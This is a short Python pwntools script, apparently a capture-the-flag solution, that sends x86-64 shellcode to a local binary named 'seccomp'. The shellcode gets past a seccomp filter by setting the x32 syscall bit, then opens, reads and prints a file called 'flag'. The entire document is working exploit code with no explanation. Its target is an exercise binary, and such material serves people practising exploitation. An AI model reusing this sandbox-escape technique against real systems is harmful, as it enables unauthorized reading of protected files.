#seccomp.py
from pwn import *
p = process("./seccomp")
context.arch = 'x86_64'

# open("flag","r")
payload = asm("mov eax, 0x40000000")
payload += asm("or eax, 2")
payload += asm("mov rdi, 0x67616c66")
payload += asm("push rdi")
payload += asm("mov rdi, rsp")
payload += asm("mov rsi, 0")
payload += asm("syscall")

# read(fd, rsp, 0xff);
payload += asm("mov rdi, rax") # open file fd
payload += asm("mov eax, 0x40000000")
payload += asm("or eax, 0")
payload += asm("mov rsi, rsp")
payload += asm("mov edx, 0xff") 
payload += asm("syscall")

# write(1, rsp, 0xff);
payload += asm("mov rdi, 1") # stdout 1 
payload += asm("mov eax, 0x40000000")
payload += asm("or eax, 1")
payload += asm("mov rsi, rsp")
payload += asm("mov edx, 0xff") 
payload += asm("syscall")

p.sendline(payload)
p.interactive()



